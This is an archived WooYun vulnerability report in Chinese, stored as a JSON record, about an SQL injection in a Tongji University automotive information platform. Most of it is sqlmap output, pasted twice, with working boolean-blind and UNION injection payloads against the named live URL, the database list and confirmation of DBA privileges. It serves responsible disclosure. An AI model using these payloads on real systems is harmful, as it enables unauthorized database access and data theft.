{"id": 76335, "wybug_id": "wooyun-2015-0165175", "wybug_title": "同济大学某信息服务平台存在注入漏洞，dba权限", "wybug_corp": "同济大学", "wybug_author": "路人甲", "wybug_date": "2015-12-28 12:36", "wybug_open_date": "2016-02-09 23:29", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向公众公开  简要描述：  同济大学汽车行业信息服务平台是利用公共网络和通讯设施建设的一个共享服务系统，主要针对汽车行业提供科技文献的服务。本平台技术先进、资源丰富，在这里您可查到汽车行业相关的各种资讯，第一时间的了解业内动态。通过本平台你可以及时的得到最新，最全的汽车信息。 详细说明：  注入点：http://dl4.lib.tongji.edu.cn/search/showdetail.aspx?rsid=b4d52eca-087d-455b-9403-d37624f61146&docid=10136&title=%E4%B8%8A%E6%B5%B7%E6%8E%A8%E5%B9%BF%E7%94%B5%E5%8A%A8%E6%B1%BD%E8%BD%A6%E5%88%86%E6%97%B6%E7%A7%9F%E8%B5%81%E8%BF%90%E8%90%A5%E6%A8%A1%E5%BC%8F\nURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 93 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://dl4.lib.tongji.edu.cn:80/search/showdetail.aspx?rsid=b4d52eca-087d-455b-9403-d37624f61146&docid=10136) AND 9506=9506 AND (9964=9964&title=%E4%B8%8A%E6%B5%B7%E6%8E%A8%E5%B9%BF%E7%94%B5%E5%8A%A8%E6%B1%BD%E8%BD%A6%E5%88%86%E6%97%B6%E7%A7%9F%E8%B5%81%E8%BF%90%E8%90%A5%E6%A8%A1%E5%BC%8F    Type: UNION query    Title: Generic UNION query (NULL) - 25 columns    Payload: http://dl4.lib.tongji.edu.cn:80/search/showdetail.aspx?rsid=b4d52eca-087d-455b-9403-d37624f61146&docid=-6506) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(118)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(107)+CHAR(108)+CHAR(84)+CHAR(113)+CHAR(112)+CHAR(68)+CHAR(111)+CHAR(109)+CHAR(80)+CHAR(84)+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(112)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &title=%E4%B8%8A%E6%B5%B7%E6%8E%A8%E5%B9%BF%E7%94%B5%E5%8A%A8%E6%B1%BD%E8%BD%A6%E5%88%86%E6%97%B6%E7%A7%9F%E8%B5%81%E8%BF%90%E8%90%A5%E6%A8%A1%E5%BC%8F---[14:17:12] [INFO] testing MySQL[14:17:27] [WARNING] the back-end DBMS is not MySQL[14:17:27] [INFO] testing Oracle[14:17:43] [WARNING] the back-end DBMS is not Oracle[14:17:43] [INFO] testing PostgreSQL[14:17:58] [WARNING] the back-end DBMS is not PostgreSQL[14:17:58] [INFO] testing Microsoft SQL Server[14:18:14] [INFO] confirming Microsoft SQL Server[14:19:16] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n\navailable databases [8]:                                                       [*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] uinirms(tongji)[*] ZJK\n\nweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[14:27:30] [INFO] testing if current user is DBA[14:27:46] [WARNING] reflective value(s) found and filtering outcurrent user is DBA:    True\n\n\n\n\n   漏洞证明：  \nURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 93 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://dl4.lib.tongji.edu.cn:80/search/showdetail.aspx?rsid=b4d52eca-087d-455b-9403-d37624f61146&docid=10136) AND 9506=9506 AND (9964=9964&title=%E4%B8%8A%E6%B5%B7%E6%8E%A8%E5%B9%BF%E7%94%B5%E5%8A%A8%E6%B1%BD%E8%BD%A6%E5%88%86%E6%97%B6%E7%A7%9F%E8%B5%81%E8%BF%90%E8%90%A5%E6%A8%A1%E5%BC%8F    Type: UNION query    Title: Generic UNION query (NULL) - 25 columns    Payload: http://dl4.lib.tongji.edu.cn:80/search/showdetail.aspx?rsid=b4d52eca-087d-455b-9403-d37624f61146&docid=-6506) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(118)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(107)+CHAR(108)+CHAR(84)+CHAR(113)+CHAR(112)+CHAR(68)+CHAR(111)+CHAR(109)+CHAR(80)+CHAR(84)+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(112)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &title=%E4%B8%8A%E6%B5%B7%E6%8E%A8%E5%B9%BF%E7%94%B5%E5%8A%A8%E6%B1%BD%E8%BD%A6%E5%88%86%E6%97%B6%E7%A7%9F%E8%B5%81%E8%BF%90%E8%90%A5%E6%A8%A1%E5%BC%8F---[14:17:12] [INFO] testing MySQL[14:17:27] [WARNING] the back-end DBMS is not MySQL[14:17:27] [INFO] testing Oracle[14:17:43] [WARNING] the back-end DBMS is not Oracle[14:17:43] [INFO] testing PostgreSQL[14:17:58] [WARNING] the back-end DBMS is not PostgreSQL[14:17:58] [INFO] testing Microsoft SQL Server[14:18:14] [INFO] confirming Microsoft SQL Server[14:19:16] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n\navailable databases [8]:                                                       [*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] uinirms(tongji)[*] ZJK\n\nweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[14:27:30] [INFO] testing if current user is DBA[14:27:46] [WARNING] reflective value(s) found and filtering outcurrent user is DBA:    True\n\n\n\n\n   修复方案：  你们更专业/   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-28 16:02 厂商回复： 感谢提醒！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}